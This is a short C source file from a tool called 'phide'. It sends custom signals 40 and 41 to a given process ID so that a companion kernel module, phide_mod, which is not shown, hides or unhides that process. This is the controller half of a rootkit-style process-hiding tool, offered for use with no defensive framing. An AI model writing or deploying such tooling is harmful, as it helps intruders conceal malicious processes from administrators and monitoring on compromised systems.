/*
 * phide.c, part of phide by noupe [tm@ns2.crw.se]
 *
 * This file demostrates howto hide a process
 * with phide_mod.
 * See README for more info.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <signal.h>
#include <errno.h>

#define SIGHIDE 40
#define SIGUNHIDE 41

void usage(char *s)
{
		printf("Usage: %s [+/-]PID\n"
			"\t+\tHide PID\n"
			"\t-\tUnhide PID\n", s);

		exit(1);
}

int main(int argc, char *argv[])
{

	if(argc != 2)
		usage(argv[0]);

	switch(argv[1][0])
	{
		case '+':
		kill(atoi(&argv[1][1]), SIGHIDE);
		break;

		case '-':
		kill(atoi(&argv[1][1]), SIGUNHIDE);
		break;

		default:
		usage(argv[0]);
		break;
	}

	if(errno)
		perror("kill");

	return 0;
}
